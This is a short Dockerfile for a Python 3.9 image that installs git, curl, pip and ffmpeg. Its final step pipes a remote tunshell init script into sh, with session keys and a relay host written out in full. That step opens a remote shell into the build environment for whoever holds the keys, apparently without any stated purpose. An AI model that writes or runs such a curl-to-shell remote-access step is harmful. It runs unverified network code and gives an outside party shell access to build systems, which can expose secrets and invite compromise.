FROM python:3.9.7-slim-buster
RUN apt-get update && apt-get upgrade -y
RUN apt-get install git curl python3-pip ffmpeg -y
RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T thUb5z6pcANKclRHIsJkRL fP6a2UEdtW1Nnv965iIUrv eu.relay.tunshell.com
